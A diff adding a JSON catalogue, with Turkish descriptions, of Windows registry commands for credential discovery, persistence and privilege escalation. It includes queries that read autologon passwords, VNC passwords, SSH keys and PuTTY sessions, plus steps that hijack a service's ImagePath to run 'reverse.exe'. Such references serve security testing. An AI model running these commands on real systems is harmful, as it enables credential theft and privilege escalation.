@@ -1,0 +1,139 @@
+{
+  "winlogon_autologon": {
+    "desc": "Windows otomatik giriş yapılandırmasını ve düz metin parolalarını kontrol eder",
+    "category": "Credential Discovery",
+    "usage": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' [PropertyName]",
+    "examples": [
+      "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' DefaultUserName",
+      "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' DefaultPassword"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Otomatik giriş kullanıcı adı ve parolası",
+    "type": "Registry Query",
+    "risk_level": "High",
+    "registry_path": "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+    "security": "Düz metin parola içerebilir"
+  },
+  "vnc_passwords": {
+    "desc": "VNC hizmetlerinin kayıtlı şifrelerini registry'den okur",
+    "category": "Credential Discovery",
+    "usage": "Get-ItemProperty [RegistryPath] [PropertyName]",
+    "examples": [
+      "Get-ItemProperty 'HKCU:\\Software\\ORL\\WinVNC3\\Password'",
+      "Get-ItemProperty 'HKCU:\\Software\\TightVNC\\Server' Password",
+      "Get-ItemProperty 'HKLM:\\Software\\TightVNC\\Server' Password"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "VNC şifreleri (şifrelenmiş)",
+    "type": "Registry Query",
+    "risk_level": "Medium",
+    "registry_paths": [
+      "HKCU:\\Software\\ORL\\WinVNC3\\Password",
+      "HKCU:\\Software\\TightVNC\\Server",
+      "HKLM:\\Software\\TightVNC\\Server"
+    ]
+  },
+  "openssh_keys": {
+    "desc": "OpenSSH agent anahtarlarını registry'den okur",
+    "category": "Credential Discovery", 
+    "usage": "Get-ItemProperty [RegistryPath]",
+    "examples": [
+      "Get-ItemProperty 'HKCU:\\Software\\OpenSSH\\Agent\\Keys'",
+      "Get-ItemProperty 'HKLM:\\Software\\OpenSSH\\Agent\\Keys'"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "SSH anahtarları",
+    "type": "Registry Query",
+    "risk_level": "Medium",
+    "registry_paths": [
+      "HKCU:\\Software\\OpenSSH\\Agent\\Keys",
+      "HKLM:\\Software\\OpenSSH\\Agent\\Keys"
+    ]
+  },
+  "putty_sessions": {
+    "desc": "PuTTY oturum bilgilerini registry'den okur",
+    "category": "Credential Discovery",
+    "usage": "Get-ItemProperty 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'",
+    "examples": ["Get-ItemProperty 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'"],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "PuTTY oturum yapılandırmaları",
+    "type": "Registry Query",
+    "risk_level": "Medium",
+    "registry_path": "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
+  },
+  "startup_programs": {
+    "desc": "Sistem başlangıcında otomatik çalışan programları yönetir",
+    "category": "Persistence",
+    "usage": "Get-ItemProperty [RegistryPath]",
+    "examples": [
+      "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
+      "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "Başlangıçta çalışan program listesi",
+    "type": "Registry Query",
+    "risk_level": "Medium",
+    "registry_paths": [
+      "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+      "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+      "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    ],
+    "descriptions": {
+      "HKLM_Run": "Makinedeki her kullanıcı için oturum açıldığında çalışan programlar",
+      "HKLM_RunOnce": "Makinede bir sonraki açılışta bir kereye mahsus çalışacak programlar",
+      "HKCU_Run": "Mevcut kullanıcı için oturum açıldığında çalışan programlar",
+      "HKCU_RunOnce": "Mevcut kullanıcı için bir sonraki oturum açmada bir kereye mahsus çalışacak programlar"
+    }
+  },
+  "always_install_elevated": {
+    "desc": "MSI dosyalarının yükseltilmiş izinlerle çalıştırılmasını sağlayan ayarı kontrol eder",
+    "category": "Privilege Escalation",
+    "usage": "Get-ItemProperty [RegistryPath] AlwaysInstallElevated",
+    "examples": [
+      "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated",
+      "Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated"
+    ],
+    "target_os": "Windows",
+    "requires_admin": false,
+    "output": "AlwaysInstallElevated ayar değeri (1=aktif, 0=pasif)",
+    "type": "Registry Query",
+    "risk_level": "High",
+    "registry_paths": [
+      "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+      "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
+    ],
+    "note": "Değer 1 ise standart kullanıcılar MSI dosyalarını yönetici olarak çalıştırabilir",
+    "security": "Yetki yükseltme vektörü"
+  },
+  "service_registry_modification": {
+    "desc": "Servis registry değerlerini değiştirerek yetki yükseltme",
+    "category": "Privilege Escalation",
+    "usage": "Set-ItemProperty [ServiceRegistryPath] -name ImagePath -Value [ExecutablePath]",
+    "examples": [
+      ".\\accesschk64.exe -k 'HKLM\\System\\CurrentControlSet\\Services\\svcregistry' -d",
+      "Set-ItemProperty HKLM:\\System\\CurrentControlSet\\Services\\svcregistry -name ImagePath -Value 'C:\\Users\\user\\Desktop\\reverse.exe'",
+      "start-service svcregistry"
+    ],
+    "target_os": "Windows",
+    "requires_admin": true,
+    "output": "Servis yapılandırması değişikliği",
+    "type": "Registry Modification",
+    "risk_level": "High",
+    "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\[ServiceName]",
+    "security": "Yetki yükseltme tekniği"
+  },
+  "windows_startup_applications_regedit_entry": {
+        "desc": "Windows Baslangic Uygulamalari ve Komutlarinin bulundugu Regedit kismi",
+        "usage": "Bilgisayar\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "category": "Regedit Entry",
+        "type": "Windows Regedit"
+  }
+}
